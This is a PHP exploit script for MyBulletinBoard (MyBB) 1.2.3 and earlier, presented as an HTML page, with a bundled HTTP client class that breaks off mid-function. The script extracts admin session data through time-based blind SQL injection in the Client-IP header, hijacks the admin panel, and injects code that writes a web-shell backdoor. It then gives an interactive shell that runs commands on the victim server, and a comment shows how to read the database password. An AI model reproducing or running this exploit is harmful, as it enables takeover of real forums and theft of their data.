<html><head><title>MyBulletinBoard (MyBB) <= 1.2.3 Remote Code Execution Exploit</title></head><pre>#!/usr/bin/php
&lt;?php
error_reporting(E_ALL ^ E_NOTICE);

# http://www.milw0rm.com/exploits/2012
# They corrected (not all) a lot of SQL requests which use the ipaddress, with $db-&gt;escape_string.
# They don't corrected the function (this is a choice ... the bad) and they forgot to correct 1 (only) SQL request.
# They must correct the problem at the source =)
#
if($argc &lt; 3)
{
print(&quot;
---  MyBulletinBoard (MyBB) &lt;= 1.2.3 Remote Code Execution Exploit  ---
-----------------------------------------------------------------------
PHP conditions: none
       Credits: DarkFig &lt;gmdarkfig@gmail.com&gt;
           URL: http://www.acid-root.new.fr/
-----------------------------------------------------------------------
  Usage: $argv[0] -url http://victim.com/ [Options]
 Params: -url       For example http://victim.com/myBB/
Options: -debug     Debug mod activated (debug_mybb.html)
         -truetime  Server response time which returns true
         -benchmark You can change the value used in benchmark()
         -proxy     If you wanna use a proxy &lt;proxyhost:proxyport&gt; 
         -proxyauth Basic authentification &lt;proxyuser:proxypwd&gt;
   Note: If you have some problems use -debug, -benchmark, -truetime
-----------------------------------------------------------------------
&quot;);exit(1);
}

$url       = getparam('url',1);
$debug     = (getparam('debug')!='')     ? 1 : 0;
$benchmark = (getparam('benchmark')!='') ? getparam('benchmark') : '1000000';
$proxy     = getparam($proxy);
$proxyauth = getparam($proxyauth);

$backdoor  = 'uploads/avatars/backdoor.php'; # inc/cache/backdoor.php
$filetoed  = 'index.lang.php';

$xpl = new phpsploit();
$xpl-&gt;agent('Firefox');
if($proxy) $xpl-&gt;proxy($proxy);
if($proxyauth) $xpl-&gt;proxyauth($proxyauth);
if($debug) debug(1);

# There is two solutions to be logged in as administrator.
#
# SOLUTION NUMBER 1
# mysql&gt; select * from mybb_users\G
# *************************** 1. row ***************************
#              uid: 1
#         username: root
#         password: 39ac8681f5cf4fcd9c9c09719a618bd3
#             salt: BFeJBOCF
#         loginkey: VYLJia9InmLgM1PT6v2whyMbaoSuprngLnkW55j3zlywItyZBA...
#
# $xpl-&gt;post($url.'admin/index.php','username=root&amp;password=toor&amp;do=login&amp;goto=');
# print $xpl-&gt;getcontent(); // ...Welcome to the MyBB Administration Control Panel...
# 
# SOLUTION NUMBER 2
# mysql&gt; select * from mybb_adminsessions\G
# *************************** 1. row ***************************
#        sid: 81e267263b9254f3aaf670383bfbfec9
#        uid: 1
#   loginkey: VYLJia9InmLgM1PT6v2whyMbaoSuprngLnkW55j3zlywItyZBA
#         ip: 127.0.0.1
#   dateline: 1175443967
# lastactive: 1175444369
#
# $xpl-&gt;addheader('Client-IP','127.0.0.1');
# $xpl-&gt;get($url.'admin/index.php?adminsid=81e267263b9254f3aaf670383bfbfec9');
# print $xpl-&gt;getcontent(); // ...Welcome to the MyBB Administration Control Panel...
#
# I decided to use the solution number 2.
# We can also add an administrator (easily) ... but it's not interesting.
#
print &quot;\nAdmin IP : &quot;; $ip  = sql_inject('ip');
print &quot;\nAdmin sid: &quot;; $sid = sql_inject('sid');
print &quot;\nTrying to be logged in as administrator&quot;;

$xpl-&gt;addheader('Client-IP',$ip);
$xpl-&gt;get($url.&quot;admin/languages.php?adminsid=$sid&quot;);

# Trying to find the language
if(preg_match('#&lt;input type=&quot;hidden&quot; name=&quot;lang&quot; value=&quot;(\S*)&quot;#',$xpl-&gt;getcontent(),$langmatches)) $lang=$langmatches[1];
else $lang='english';
print &quot;\nLanguage: $lang&quot;;

# Language configuration
$xpl-&gt;get($url.&quot;admin/languages.php?adminsid=$sid&amp;action=edit&amp;lang=$lang&amp;editwith=0&amp;file=$filetoed&quot;);
preg_match_all('#name=&quot;(.*)&quot;&gt;(.*)&lt;/textarea&gt;#',$xpl-&gt;getcontent(),$name_value);

# We can't use:
# - &lt;? OR &lt;?php
# - &lt;script language=&quot;php&quot;&gt;
# - ' OR &quot;
#
$PHPCODE = '${${error_reporting(0)}}'
          .'${${$handle=fopen('.chrit('./'.$backdoor).','.chrit('w').')}}'
          .'${${fwrite($handle,'.chrit('&lt;?php error_reporting(0);eval($_SERVER[HTTP_SHELL]);exit(0); ?&gt;').')}}'
          .'${${fclose($handle)}}';
$name_value[2][0] .= $PHPCODE;

$postdata=array(frmdt_url =&gt; $url.'admin/languages.php',
               &quot;adminsid&quot; =&gt; $sid, &quot;action&quot; =&gt; &quot;do_edit&quot;,
               &quot;lang&quot; =&gt; $lang, &quot;editwith&quot; =&gt; 0,
               &quot;inadmin&quot;=&gt; 0, &quot;file&quot;=&gt; $filetoed,
               &quot;Update Language Variables&quot;=&gt;&quot;  Update Language Variables&quot;);

for($i=0;$i&lt;count($name_value[1]);$i++)	$postdata[html_entity_decode($name_value[1][$i])] = html_entity_decode($name_value[2][$i]);

# print $xpl-&gt;showlastrequest();
$xpl-&gt;formdata($postdata);

# Trying to execute the php code
$xpl-&gt;get($url.'index.php');

# If not the default language
$xpl-&gt;get($url.'inc/languages/'.$lang.'/'.$filetoed);
print &quot;\nThe php file should be created\n\$shell&gt; &quot;;

# Hello master
while(!preg_match(&quot;#^(quit|exit)$#&quot;,($cmd = trim(fgets(STDIN)))))
{
    # ');include('../../inc/config.php');print $config['password'];//
    $xpl-&gt;addheader('Shell',&quot;system('$cmd');&quot;);
    $xpl-&gt;get($url.$backdoor);
    print $xpl-&gt;getcontent().&quot;\n\$shell&gt; &quot;;
}

function sql_inject($field)
{
	global $xpl,$url,$prefix,$debug,$result,$bef,$aft,$truetime,$benchmark,$a,$b,$sub,$f; #,$fakeip
	$sub=0;$string='';
	
	if($field=='ip') {$a='44';$b='57';} # . 0-9
	else {$a='46';$b='70';}             # 0-9 A-Z
	
	while(TRUE)
	{
		$sub++;
		for($i=$a;$i&lt;=$b;$i++)
		{
			# Random ip
			$fakeip = rand(128,254).'.'
			         .rand(128,254).'.'
			         .rand(128,254).'.'
			         .rand(128,254);

			# Calculation of the server response time which returns TRUE
			if($i==$a) $f='TST';
			
			# End of the string ?
			elseif($i==($a+1)) $f='NULL';
			
			# Test the char
			else $f=$i;
			
			# Table prefix
			if($sub==1 AND $i==$a)
			{
				$xpl-&gt;addheader('Client-IP',$fakeip.&quot;'&lt;script&gt;alert(666)&lt;/script&gt;&quot;);
				$xpl-&gt;get($url.'index.php');

				if(preg_match(&quot;#DELETE FROM (\S*)sessions#i&quot;,$xpl-&gt;getcontent(),$match)) $prefix=$match[1];
				else $prefix='mybb_';
			}

			# +-class_session.php (#2)
			# |
			# 475.	function create_session($uid=0)
			# 476.	{
			# 477.		global $db;
			# 478.		$speciallocs = $this-&gt;get_special_locations();
			# 479.
			# 480.		// If there is a proper uid, delete by uid.
			# 481.		if($uid &gt; 0)
			# 482.		{
			# 483.			$db-&gt;delete_query(TABLE_PREFIX.&quot;sessions&quot;, &quot;uid=&quot;.$uid);
			# 484.			$onlinedata['uid'] = $uid;
			# 485.		}
			# 486.		// Else delete by ip.
			# 487.		else
			# 488.		{   // $this-&gt;ipaddress = get_ip();
			# 489.			$db-&gt;delete_query(TABLE_PREFIX.&quot;sessions&quot;, &quot;ip='&quot;.$this-&gt;ipaddress.&quot;'&quot;);
			# 490.			$onlinedata['uid'] = 0;
			# 491.		}
			#
			$sql  = $fakeip.&quot;' OR ip=(SELECT IF(SUBSTR(&quot;;
			$sql .= ($f=='TST') ? &quot;(SELECT 1)&quot; : &quot;(SELECT $field FROM ${prefix}adminsessions ORDER BY lastactive DESC LIMIT 1)&quot;;
			$sql .= ($f=='TST') ? &quot;,1&quot; : &quot;,$sub&quot;;
			$sql .= ($f=='TST') ? &quot;,1)=CHAR(49)&quot; : &quot;,1)=CHAR($f)&quot;;
			$sql .= &quot;,BENCHMARK($benchmark,CHAR(66)),1)) #&quot;;


			# +-functions.php (#1)
			# |
			# 1836. function get_ip()
			# 1837. {
			# 1838.	if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
			# 1839.	{
			# 1840.		if(preg_match_all(&quot;#[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}#s&quot;, $_SERVER['HTTP_X_FORWARDED_FOR'], $addresses))
			# 1841.		{
			# 1842.			foreach($addresses[0] as $key =&gt; $val)
			# 1843.			{
			# 1844.				if(!preg_match(&quot;#^(10|172\.16|192\.168)\.#&quot;, $val))
			# 1845.				{
			# 1846.					$ip = $val;
			# 1847.					break;
			# 1848.				}
			# 1849.			}
			# 1850.		}
			# 1851.	}
			# 1852.	if(!isset($ip))
			# 1853.	{
			# 1854.		if(isset($_SERVER['HTTP_CLIENT_IP']))
			# 1855.		{
			# 1856.			$ip = $_SERVER['HTTP_CLIENT_IP'];
			# 1857.		}
			# 1858.		else
			# 1859.		{
			# 1860.			$ip = $_SERVER['REMOTE_ADDR'];
			# 1861.		}
			# 1862.	}
			# 1863.	return $ip;
			# 1864. }
			#
			$bef = time();
			$xpl-&gt;reset('header');
			$xpl-&gt;addheader('Client-IP',$sql);
			$xpl-&gt;get($url.'index.php');
			$aft = time();
			
			if($f=='TST') $truetime=$aft-$bef;
			if(getparam('truetime')!='') $truetime=getparam('truetime');
			
			# Server response time &gt;= Server response time which returns TRUE ?
			$restime = $aft-$bef;
			if($restime &gt;= $truetime AND $f != 'TST') $result='TRUE';
			else $result='FALSE';

			# Debug mode activated
			if($debug) debug('',$field);
			
			# The tested char returns TRUE
			if($result=='TRUE')
			{
				if($f!='NULL')
				{
					# Continue
					print strtolower(chr($f));
					$string .= chr($f);
					break;
				}
				else
				{
					# End of the string
					$xpl-&gt;reset('header');
					return $string;
				}
			}
			
			# Retry if no char found
			if($f==$b) $sub--;
		}
	}
}

function debug($init='',$dafield='')
{
	global $result,$bef,$aft,$truetime,$benchmark,$a,$b,$sub,$f; #,$fakeip
	if($init)
	{
		$handle = fopen(&quot;debug_mybb.html&quot;,&quot;w+&quot;);
		$data = &quot;&lt;h1&gt;&lt;div align='center'&gt;MyBulletinBoard (MyBB) &amp;lt;= 1.2.3 Code Execution Exploit&lt;/div&gt;&lt;/h1&gt;
		&lt;pre&gt;&lt;table width='0' border='1' align='center' cellspacing='0'&gt;&lt;tr&gt;
		&lt;td align='center'&gt;&lt;b&gt;REQUEST TIME&lt;/b&gt;&lt;/td&gt;
		&lt;td align='center'&gt;&lt;b&gt;RESPONSE TIME&lt;/b&gt;&lt;/td&gt;
		&lt;td align='center'&gt;&lt;b&gt;TRUETIME&lt;/b&gt;&lt;/td&gt;
		&lt;td align='center'&gt;&lt;b&gt;BENCHMARK&lt;/b&gt;&lt;/td&gt;
		&lt;td align='center'&gt;&lt;b&gt;RESULT&lt;/b&gt;&lt;/td&gt;&quot;;
		# &lt;td align='center'&gt;&lt;b&gt;IP&lt;/b&gt;&lt;/td&gt;
		$data .= &quot;&lt;td align='center'&gt;&lt;b&gt;FIELD&lt;/b&gt;&lt;/td&gt;
		&lt;td align='center'&gt;&lt;b&gt;CHARSET&lt;/b&gt;&lt;/td&gt;
		&lt;td align='center'&gt;&lt;b&gt;SUBSTR()&lt;/b&gt;&lt;/td&gt;
		&lt;td align='center'&gt;&lt;b&gt;ORD()&lt;/b&gt;&lt;/td&gt;
		&lt;td align='center'&gt;&lt;b&gt;CHAR()&lt;/b&gt;&lt;/td&gt;&quot;;
		fwrite($handle,$data);
		fclose($handle);
	}
	else
	{
		$handle = fopen(&quot;debug_mybb.html&quot;,&quot;a&quot;);
		$data   = &quot;&lt;tr&quot;.(($result=='TRUE') ? &quot; bgcolor='#FFFF00'&quot; : &quot;&quot;).&quot;&gt;
		&lt;td align='center'&gt;&amp;nbsp;&quot;.htmlentities($bef).&quot;&amp;nbsp;&lt;/td&gt;
		&lt;td align='center'&gt;&amp;nbsp;&quot;.htmlentities($aft).&quot;&amp;nbsp;&lt;/td&gt;
		&lt;td align='center'&gt;&amp;nbsp;&quot;.htmlentities($truetime).&quot;&amp;nbsp;&lt;/td&gt;
		&lt;td align='center'&gt;&amp;nbsp;&quot;.htmlentities($benchmark).&quot;&amp;nbsp;&lt;/td&gt;
		&lt;td align='center'&gt;&amp;nbsp;&quot;.htmlentities($result).&quot;&amp;nbsp;&lt;/td&gt;&quot;;
		# &lt;td align='center'&gt;&amp;nbsp;&quot;.htmlentities($fakeip).&quot;&amp;nbsp;&lt;/td&gt;
		$data .= &quot;&lt;td align='center'&gt;&amp;nbsp;&quot;.htmlentities($dafield).&quot;&amp;nbsp;&lt;/td&gt;
		&lt;td align='center'&gt;&amp;nbsp;&quot;.htmlentities(&quot;$a-$b&quot;).&quot;&amp;nbsp;&lt;/td&gt;
		&lt;td align='center'&gt;&amp;nbsp;&quot;.htmlentities($sub).&quot;&amp;nbsp;&lt;/td&gt;
		&lt;td align='center'&gt;&amp;nbsp;&quot;.htmlentities($f).&quot;&amp;nbsp;&lt;/td&gt;
		&lt;td align='center'&gt;&amp;nbsp;&quot;.htmlentities(chr($f)).&quot;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&quot;;
		fwrite($handle,$data);
		fclose($handle);
	}
}

function chrit($string)
{
	$char = '';
	for($i=0;$i&lt;strlen($string);$i++)
	{
		$char .= 'chr('.ord($string[$i]).')';
		$char .= ($i != (strlen($string)-1)) ? '.' : '';
	}
	return $char;
}

function getparam($param,$opt='')
{
	global $argv;
	foreach($argv as $value =&gt; $key)
	{
		if($key == '-'.$param) {
		   if(!empty($argv[$value+1])) return $argv[$value+1];
		   else return 1;
		}
	}
	if($opt) exit(&quot;\n-$param parameter required&quot;);
	else return;
}

/*
 * 
 * Copyright (C) darkfig
 * 
 * This program is free software; you can redistribute it and/or 
 * modify it under the terms of the GNU General Public License 
 * as published by the Free Software Foundation; either version 2 
 * of the License, or (at your option) any later version. 
 * 
 * This program is distributed in the hope that it will be useful, 
 * but WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 * GNU General Public License for more details. 
 * 
 * You should have received a copy of the GNU General Public License 
 * along with this program; if not, write to the Free Software 
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 * 
 * TITLE:          PhpSploit Class
 * REQUIREMENTS:   PHP 5 (remove &quot;private&quot;, &quot;public&quot; if you have PHP 4)
 * VERSION:        1.2
 * LICENSE:        GNU General Public License
 * ORIGINAL URL:   http://www.acid-root.new.fr/tools/03061230.txt
 * FILENAME:       phpsploitclass.php
 *
 * CONTACT:        gmdarkfig@gmail.com (french / english)
 * GREETZ:         Sparah, Ddx39
 *
 * DESCRIPTION:
 * The phpsploit is a class implementing a web user agent.
 * You can add cookies, headers, use a proxy server with (or without) a
 * basic authentification. It supports the GET and the POST method. It can
 * also be used like a browser with the cookiejar() function (which allow
 * a server to add several cookies for the next requests) and the
 * allowredirection() function (which allow the script to follow all
 * redirections sent by the server). It can return the content (or the
 * headers) of the request. Others useful functions can be used for debugging.
 * A manual is actually in development but to know how to use it, you can
 * read the comments.
 *
 * CHANGELOG:
 * [2007-01-24] (1.2)
 *  * Bug #2 fixed: Problem concerning the getcookie() function ((|;))
 *  * New: multipart/form-data enctype is now supported 
 *
 * [2006-12-31] (1.1)
 *  * Bug #1 fixed: Problem concerning the allowredirection() function (chr(13) bug)
 *  * New: You can now call the getheader() / getcontent() function without parameters
 *
 * [2006-12-30] (1.0)
 *  * First version
 * 
 */

class phpsploit {

	/**
	 * This function is called by the get()/post() functions.
	 * You don't have to call it, this is the main function.
	 *
	 * @return $server_response
	 */
	private function sock()
	{
		if(!empty($this-&gt;proxyhost) &amp;&amp; !empty($this-&gt;proxyport)) $socket = fsockopen($this-&gt;proxyhost,$this-&gt;proxyport);
		else $socket = fsockopen($this-&gt;host,$this-&gt;port);
		
		if(!$socket) die(&quot;Error: The host doesn't exist&quot;);
		
		if($this-&gt;method===&quot;get&quot;) $this-&gt;packet = &quot;GET &quot;.$this-&gt;url.&quot; HTTP/1.1\r\n&quot;;
		elseif($this-&gt;method===&quot;post&quot; or $this-&gt;method===&quot;formdata&quot;) $this-&gt;packet = &quot;POST &quot;.$this-&gt;url. &quot; HTTP/1.1\r\n&quot;;
		else die(&quot;Error: Invalid method&quot;);
		
		if(!empty($this-&gt;proxyuser)) $this-&gt;packet .= &quot;Proxy-Authorization: Basic &quot;.base64_encode($this-&gt;proxyuser.&quot;:&quot;.$this-&gt;proxypass).&quot;\r\n&quot;;
		$this-&gt;packet .= &quot;Host: &quot;.$this-&gt;host.&quot;\r\n&quot;;
		
		if(!empty($this-&gt;agent))  $this-&gt;packet .= &quot;User-Agent: &quot;.$this-&gt;agent.&quot;\r\n&quot;;
		if(!empty($this-&gt;header)) $this-&gt;packet .= $this-&gt;header.&quot;\r\n&quot;;
		if(!empty($this-&gt;cookie)) $this-&gt;packet .= &quot;Cookie: &quot;.$this-&gt;cookie.&quot;\r\n&quot;;
		
		$this-&gt;packet .= &quot;Connection: Close\r\n&quot;;
		if($this-&gt;method===&quot;post&quot;)
		{
			$this-&gt;packet .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
			$this-&gt;packet .= &quot;Content-Length: &quot;.strlen($this-&gt;data).&quot;\r\n\r\n&quot;;
			$this-&gt;packet .= $this-&gt;data.&quot;\r\n&quot;;
		}
		elseif($this-&gt;method===&quot;formdata&quot;)
		{
			$this-&gt;packet .= &quot;Content-Type: multipart/form-data; boundary=---------------------------&quot;.$this-&gt;boundary.&quot;\r\n&quot;;
			$this-&gt;packet .= &quot;Content-Length: &quot;.strlen($this-&gt;data).&quot;\r\n\r\n&quot;;
			$this-&gt;packet .= $this-&gt;data;
		}
		$this-&gt;packet .= &quot;\r\n&quot;;
		$this-&gt;recv = '';
		
		fputs($socket,$this-&gt;packet);
		while(!feof($socket)) $this-&gt;recv .= fgets($socket);
		fclose($socket);
		
		if($this-&gt;cookiejar) $this-&gt;cookiejar($this-&gt;getheader($this-&gt;recv));
		if($this-&gt;allowredirection) return $this-&gt;allowredirection($this-&gt;recv);
		else return $this-&gt;recv;
	}
	

	/**
	 * This function allows you to add several cookie in the
	 * request. Several methods are supported:
	 * 
	 * $this-&gt;addcookie(&quot;name&quot;,&quot;value&quot;);
	 * or
	 * $this-&gt;addcookie(&quot;name=newvalue&quot;);
	 * or
	 * $this-&gt;addcookie(&quot;othername=overvalue; xx=zz; y=u&quot;);
	 * 
	 * @param string $cookiename
	 * @param string $cookievalue
	 * 
	 */
	public function addcookie($cookn,$cookv='')
	{
		// $this-&gt;addcookie(&quot;name&quot;,&quot;value&quot;); work avec replace
		if(!empty($cookv))
		{
			if($cookv === &quot;deleted&quot;) $cookv=''; // cookiejar(1) &amp;&amp; Set-Cookie: name=delete
			if(!empty($this-&gt;cookie))
			{
			    if(preg_match(&quot;/$cookn=/&quot;,$this-&gt;cookie))
			    {
			    	$this-&gt;cookie = preg_replace(&quot;/$cookn=(\S*);/&quot;,&quot;$cookn=$cookv;&quot;,$this-&gt;cookie);
			    }
			    else
			    {
			    	$this-&gt;cookie .= &quot; &quot;.$cookn.&quot;=&quot;.$cookv.&quot;;&quot;; // &quot; &quot;.
			    }
			}
			else
			{
				$this-&gt;cookie = $cookn.&quot;=&quot;.$cookv.&quot;;&quot;;
			}
		}
		// $this-&gt;addcookie(&quot;name=value; othername=othervalue&quot;);
		else
		{
	    	 if(!empty($this-&gt;cookie))
	    	 {
	    	 	$cookn = preg_replace(&quot;/(.*);$/&quot;,&quot;$1&quot;,$cookn);
	    	 	$cookarr = explode(&quot;;&quot;,str_replace(&quot; &quot;, &quot;&quot;,$cookn));
	    	 	for($i=0;$i&lt;count($cookarr);$i++)
	    	 	{
	    	 		preg_match(&quot;/(\S*)=(\S*)/&quot;,$cookarr[$i],$matches);
	    	 		$cookn = $matches[1];
	    	 		$cookv = $matches[2];
	    	 		$this-&gt;addcookie($cookn,$cookv);
	    	 	}
	    	 }
			 else
			 {
			 	$cookn = ((substr($cookn,(strlen($cookn)-1),1))===&quot;;&quot;) ? $cookn : $cookn.&quot;;&quot;;
			 	$this-&gt;cookie = $cookn;			
			 }
		}
	}
	
	
	/**
	 * This function allows you to add several headers in the
	 * request. Several methods are supported:
	 *
	 * $this-&gt;addheader(&quot;headername&quot;,&quot;headervalue&quot;);
	 * or
	 * $this-&gt;addheader(&quot;headername: headervalue&quot;);
	 *
	 * @param string $headername
	 * @param string $headervalue
	 */
	public function addheader($headern,$headervalue='')
	{
		// $this-&gt;addheader(&quot;name&quot;,&quot;value&quot;);
		if(!empty($headervalue))
		{
			if(!empty($this-&gt;header))
			{
				if(preg_match(&quot;/$headern:/&quot;,$this-&gt;header))
				{
					$this-&gt;header = preg_replace(&quot;/$headern: (\S*)/&quot;,&quot;$headern: $headervalue&quot;,$this-&gt;header);
				}
				else
				{
					$this-&gt;header .= &quot;\r\n&quot;.$headern.&quot;: &quot;.$headervalue;
				}
			}
			else
			{
				$this-&gt;header=$headern.&quot;: &quot;.$headervalue;
			}
		}
		// $this-&gt;addheader(&quot;name: value&quot;);
		else 
		{
			if(!empty($this-&gt;header))
			{
				$headarr = explode(&quot;: &quot;,$headern);
				$headern = $headarr[0];
				$headerv = $headarr[1];
				$this-&gt;addheader($headern,$headerv);
			}
			else
			{
				$this-&gt;header=$headern;
			}
		}
	}
	

	/**
	 * This function allows you to use an http proxy server.
	 * Several methods are supported:
	 * 
	 * $this-&gt;proxy(&quot;proxyip&quot;,&quot;8118&quot;);
	 * or
	 * $this-&gt;proxy(&quot;proxyip:8118&quot;)
	 *
	 * @param string $proxyhost
	 * @param integer $proxyport
	 */
	public function proxy($proxy,$proxyp='')
	{
		// $this-&gt;proxy(&quot;localhost:8118&quot;);
		if(empty($proxyp))
		{
			preg_match(&quot;/^(\S*):(\d+)$/&quot;,$proxy,$proxarr);
			$proxh = $proxarr[1];
			$proxp = $proxarr[2];
			$this-&gt;proxyhost=$proxh;
			$this-&gt;proxyport=$proxp;
		}
		// $this-&gt;proxy(&quot;localhost&quot;,8118);
		else 
		{
			$this-&gt;proxyhost=$proxy;
			$this-&gt;proxyport=intval($proxyp);
		}
		if($this-&gt;proxyport &gt; 65535) die(&quot;Error: Invalid port number&quot;);
	}
	

	/**
	 * This function allows you to use an http proxy server
	 * which requires a basic authentification. Several
	 * methods are supported:
	 * 
	 * $this-&gt;proxyauth(&quot;darkfig&quot;,&quot;dapasswd&quot;);
	 * or
	 * $this-&gt;proxyauth(&quot;darkfig:dapasswd&quot;);
	 *
	 * @param string $proxyuser
	 * @param string $proxypass
	 */
	public function proxyauth($proxyauth,$proxypasse='')
	{
		// $this-&gt;proxyauth(&quot;darkfig:password&quot;);
		if(empty($proxypasse))
		{
			preg_match(&quot;/^(.*):(.*)$/&quot;,$proxyauth,$proxautharr);
			$proxu = $proxautharr[1];
			$proxp = $proxautharr[2];
			$this-&gt;proxyuser=$proxu;
			$this-&gt;proxypass=$proxp;
		}
		// $this-&gt;proxyauth(&quot;darkfig&quot;,&quot;password&quot;);
		else
		{
			$this-&gt;proxyuser=$proxyauth;
			$this-&gt;proxypass=$proxypasse;
		}
	}

	
	/**
	 * This function allows you to set the &quot;User-Agent&quot; header.
	 * Several methods are possible to do that:
	 * 
	 * $this-&gt;agent(&quot;Mozilla Firefox&quot;);
	 * or
	 * $this-&gt;addheader(&quot;User-Agent: Mozilla Firefox&quot;);
	 * or
	 * $this-&gt;addheader(&quot;User-Agent&quot;,&quot;Mozilla Firefox&quot;);
	 * 
	 * @param string $useragent
	 */
	public function agent($useragent)
	{
		$this-&gt;agent=$useragent;
	}

	
	/**
	 * This function returns the header which will be
	 * in the next request.
	 * 
	 * $this-&gt;showheader();
	 *
	 * @return $header
	 */
	public function showheader()
	{
		return $this-&gt;header;
	}

	
	/**
	 * This function returns the cookie which will be
	 * in the next request.
	 * 
	 * $this-&gt;showcookie();
	 *
	 * @return $storedcookies
	 */
	public function showcookie()
	{
		return $this-&gt;cookie;
	}

	
	/**
	 * This function returns the last formed
	 * http request (the http packet).
	 * 
	 * $this-&gt;showlastrequest();
	 * 
	 * @return $last_http_request
	 */
	public function showlastrequest()
	{
		return $this-&gt;packet;
	}
	
	
	/**
	 * This function sends the formed http packet with the
	 * GET method. You can precise the port of the host.
	 * 
	 * $this-&gt;get(&quot;http://localhost&quot;);
	 * $this-&gt;get(&quot;http://localhost:888/xd/tst.php&quot;);
	 * 
	 * @param string $urlwithpath
	 * @return $server_response
	 */
	public function get($url)
	{
		$this-&gt;target($url);
		$this-&gt;method=&quot;get&quot;;
		return $this-&gt;sock();
	}

	
	/**
	 * This function sends the formed http packet with the
	 * POST method. You can precise the port of the host.
	 * 
	 * $this-&gt;post(&quot;http://localhost/index.php&quot;,&quot;admin=1&amp;user=dark&quot;);
	 *
	 * @param string $urlwithpath
	 * @param string $postdata
	 * @return $server_response
	 */	
	public function post($url,$data)
	{
		$this-&gt;target($url);
		$this-&gt;method=&quot;post&quot;;
		$this-&gt;data=$data;
		return $this-&gt;sock();
	}
	

	/**
	 * This function sends the formed http packet with the
	 * POST method using the multipart/form-data enctype. 
	 * 
	 * $array = array(
	 *          frmdt_url      =&gt; &quot;http://localhost/upload.php&quot;,
	 *          frmdt_boundary =&gt; &quot;123456&quot;,                    # Optional
	 *                 &quot;email&quot; =&gt; &quot;me@u.com&quot;,
	 *               &quot;varname&quot; =&gt; array(
	 *                            frmdt_type =&gt; &quot;image/gif&quot;,   # Optional
	 *                       frmdt_transfert =&gt; &quot;binary&quot;,      # Optional
	 *                        frmdt_filename =&gt; &quot;hello.php&quot;,
	 *                         frmdt_content =&gt; &quot;&lt;?php echo ':)'; ?&gt;&quot;));
	 * $this-&gt;formdata($array);
	 *
	 * @param array $array
	 * @return $server_response
	 */
	public function formdata($array)
	{
		$this-&gt;target($array[frmdt_url]);
		$this-&gt;method=&quot;formdata&quot;;
		$this-&gt;data='';
		if(!isset($array[frmdt_boundary])) $this-&gt;boundary=&quot;phpsploit&quot;;
		else $this-&gt;boundary=$array[frmdt_boundary];
		foreach($array as $key =&gt; $value)
		{
			if(!preg_match(&quot;#^frmdt_(boundary|url)#&quot;,$key))
			{
				$this-&gt;data .= &quot;-----------------------------&quot;.$this-&gt;boundary.&quot;\r\n&quot;;
				$this-&gt;data .= &quot;Content-Disposition: form-data; name=\&quot;&quot;.$key.&quot;\&quot;;&quot;;
				if(!is_array($value))
				{
					$this-&gt;data .= &quot;\r\n\r\n&quot;.$value.&quot;\r\n&quot;;
				}
				else
				{
					$this-&gt;data .= &quot; filename=\&quot;&quot;.$array[$key][frmdt_filename].&quot;\&quot;;\r\n&quot;;
					if(isset($array[$key][frmdt_type])) $this-&gt;data .= &quot;Content-Type: &quot;.$array[$key][frmdt_type].&quot;\r\n&quot;;
					if(isset($array[$key][frmdt_transfert])) $this-&gt;data .= &quot;Content-Transfer-Encoding: &quot;.$array[$key][frmdt_transfert].&quot;\r\n&quot;;
					$this-&gt;data .= &quot;\r\n&quot;.$array[$key][frmdt_content].&quot;\r\n&quot;;
				}
			}
		}
		$this-&gt;data .= &quot;-----------------------------&quot;.$this-&gt;boundary.&quot;--\r\n&quot;;
		return $this-&gt;sock();
	}

	
	/**
	 * This function returns the content of the server response
	 * without the headers.
	 * 
	 * $this-&gt;getcontent($this-&gt;get(&quot;http://localhost/&quot;));
	 * or
	 * $this-&gt;getcontent();
	 *
	 * @param string $server_response
	 * @return $onlythecontent
	 */
	public function getcontent($code='')
	{
		if(empty($code)) $code = $this-&gt;recv;
		$content = explode(&quot;\n&quot;,$code);
		$onlycode = '';
		for($i=1;$i&lt;count($content);$i++)
		{
			if(!preg_match(&quot;/^(\S*):/&quot;,$content[$i])) $ok = 1;
			if($ok) $onlycode .= $content[$i].&quot;\n&quot;;
		}
		return $onlycode;
	}

	
	/**
	 * This function returns the headers of the server response
	 * without the content.
	 * 
	 * $this-&gt;getheader($this-&gt;post(&quot;http://localhost/x.php&quot;,&quot;x=1&amp;z=2&quot;));
	 * or
	 * $this-&gt;getheader();
	 *
	 * @param string $server_response
	 * @return $onlytheheaders
	 */
	public function getheader($code='')
	{
		if(empty($code)) $code = $this-&gt;recv;
		$header = explode(&quot;\n&quot;,$code);
		$onlyheader = $header[0].&quot;\n&quot;;
		for($i=1;$i&lt;count($header);$i++)
		{
			if(!preg_match(&quot;/^(\S*):/&quot;,$header[$i])) break;
			$onlyheader .= $header[$i].&quot;\n&quot;;
		}
		return $onlyheader;
	}

	
	/**
	 * This function is called by the cookiejar() function.
	 * It adds the value of the &quot;Set-Cookie&quot; header in the &quot;Cookie&quot;
	 * header for the next request. You don't have to call it.
	 * 
	 * @param string $server_response
	 */
	private function getcookie($code)
	{
		$carr = explode(&quot;\n&quot;,str_replace(&quot;\r\n&quot;,&quot;\n&quot;,$code));
		for($z=0;$z&lt;count($carr);$z++)
		{
			if(preg_match(&quot;/set-cookie: (.*)/i&quot;,$carr[$z],$cookarr))
			{
				$cookie[] = preg_replace(&quot;/expires=(.*)(GMT||UTC)(\S*)$/i&quot;,&quot;&quot;,preg_replace(&quot;/path=(.*)/i&quot;,&quot;&quot;,$cookarr[1]));
			}
		}

		for($i=0;$i&lt;count($cookie);$i++)
		{
			preg_match(&quot;/(\S*)=(\S*)(|;)/&quot;,$cookie[$i],$matches);
	    	        $cookn = $matches[1];
	    	        $cookv = $matches[2];
	    	        $this-&gt;addcookie($cookn,$cookv);
		}
    }

	
	/**
	 * This function is called by the get()/post() functions.
	 * You don't have to call it.
	 *
	 * @param string $urltarg
	 */
	private function target($urltarg)
	{
		if(!preg_match(&quot;/^http:\/\/(.*)\//&quot;,$urltarg)) $urltarg .= &quot;/&quot;;
		$this-&gt;url=$urltarg;
		
